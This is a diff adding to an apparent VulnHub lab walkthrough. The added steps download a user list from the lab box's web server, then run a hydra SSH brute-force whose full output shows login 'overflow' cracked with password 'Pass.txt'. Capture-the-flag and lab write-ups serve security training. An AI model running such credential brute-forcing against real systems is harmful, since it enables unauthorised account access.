@@ -114,9 +114,62 @@ that it might me the actual directory we should navigate in the web site so go t
 
 ![directory](https://github.com/Git-K3rnel/VulnHub/assets/127470407/10cd92b7-4704-48c5-a92e-e5df417f47de)
 
+download the files in these two folders :
 
+```bash
+root@kali: wget http://192.168.127.141/0x0856BF/good_luck/which_one_lol.txt
 
+root@kali: wget http://192.168.127.141/0x0856BF/this_folder_contains_the_password/Pass.txt
+```
 
+inside the `which_one_lol.txt` file we see a list of users :
+
+```txt
+maleus
+ps-aux
+felux
+Eagle11
+genphlux
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+```
+
+and inside `Pass.txt`, it just says `Good_job_:)`
+
+i tried brute forcing the ssh with `Good_job` password but it did not work.
+
+since it is just a crazy and ridiculous machine, i though that the folder `this_folder_contains_the_password` in the web site
+
+we found earlier points to the fact that the name of the file `Pass.txt` is the real password
+
+so i used hydra against the SSH service with `Pass.txt` as the password  :
+
+```bash
+root@kali:  hydra -L users.txt -p Pass.txt 192.168.127.141 ssh -V
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-17 07:29:08
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
+[DATA] attacking ssh://192.168.127.141:22/
+[ATTEMPT] target 192.168.127.141 - login "maleus" - pass "Pass.txt" - 1 of 10 [child 0] (0/0)
+[ATTEMPT] target 192.168.127.141 - login "ps-aux" - pass "Pass.txt" - 2 of 10 [child 1] (0/0)
+[ATTEMPT] target 192.168.127.141 - login "felux" - pass "Pass.txt" - 3 of 10 [child 2] (0/0)
+[ATTEMPT] target 192.168.127.141 - login "Eagle11" - pass "Pass.txt" - 4 of 10 [child 3] (0/0)
+[ATTEMPT] target 192.168.127.141 - login "genphlux" - pass "Pass.txt" - 5 of 10 [child 4] (0/0)
+[ATTEMPT] target 192.168.127.141 - login "usmc8892" - pass "Pass.txt" - 6 of 10 [child 5] (0/0)
+[ATTEMPT] target 192.168.127.141 - login "blawrg" - pass "Pass.txt" - 7 of 10 [child 6] (0/0)
+[ATTEMPT] target 192.168.127.141 - login "wytshadow" - pass "Pass.txt" - 8 of 10 [child 7] (0/0)
+[ATTEMPT] target 192.168.127.141 - login "vis1t0r" - pass "Pass.txt" - 9 of 10 [child 8] (0/0)
+[ATTEMPT] target 192.168.127.141 - login "overflow" - pass "Pass.txt" - 10 of 10 [child 9] (0/0)
+[22][ssh] host: 192.168.127.141   login: overflow   password: Pass.txt
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-17 07:29:11
+```
 
 
 
